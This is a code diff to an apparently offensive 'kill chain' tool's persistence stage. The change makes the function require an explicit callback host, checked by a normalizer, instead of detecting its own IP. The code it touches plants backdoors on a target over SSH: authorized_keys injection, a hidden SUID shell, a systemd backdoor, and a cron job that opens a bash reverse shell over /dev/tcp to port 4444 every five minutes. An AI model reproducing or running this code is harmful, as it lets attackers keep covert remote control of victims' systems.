@@ -18,7 +18,7 @@ except ImportError:
     def find_wordlist(cat): return ""
     def find_all_wordlists(cat): return []
 
-from core.killchain.lateral import _get_our_ip
+from core.execution.policy import normalize_host
 from core.killchain.ssh_helpers import _ssh_connect, _ssh_exec
 
 # ANSI Colors
@@ -35,7 +35,13 @@ C_RESET  = "\033[0m"
 # PARAMIKO SSH HELPERS (shared across stages)
 
 
-def plant_persistence(host: str, user: str, password: str, port: int = 22) -> str:
+def plant_persistence(
+    host: str,
+    user: str,
+    password: str,
+    port: int = 22,
+    callback_host: str = "",
+) -> str:
     """
     Plant active persistence mechanisms on target.
     - SSH authorized_keys injection
@@ -43,6 +49,12 @@ def plant_persistence(host: str, user: str, password: str, port: int = 22) -> st
     - Hidden SUID shell
     - Systemd service backdoor
     """
+    if not callback_host:
+        return "[!] Persistence blocked: explicit callback_host is required."
+    try:
+        callback_host = normalize_host(callback_host)
+    except ValueError:
+        return "[!] Persistence blocked: callback_host must be one host without URL syntax."
     print(f"\n  {C_RED}[KILL CHAIN] Stage 4: Active Persistence — {user}@{host}{C_RESET}")
     output = f"[KILL CHAIN — PERSISTENCE — {user}@{host}:{port}]\n{'═' * 60}\n\n"
 
@@ -113,7 +125,7 @@ def plant_persistence(host: str, user: str, password: str, port: int = 22) -> st
         # ── METHOD 2: Crontab reverse shell ──────────────────────
         print(f"    {C_CYAN}[*] Setting up crontab persistence...{C_RESET}")
         # Get our IP for reverse shell
-        our_ip = _get_our_ip()
+        our_ip = callback_host
         if our_ip:
             cron_cmd = f"*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/{our_ip}/4444 0>&1' 2>/dev/null"
             # Add to crontab without overwriting
@@ -165,4 +177,3 @@ def plant_persistence(host: str, user: str, password: str, port: int = 22) -> st
         client.close()
 
     return output
-
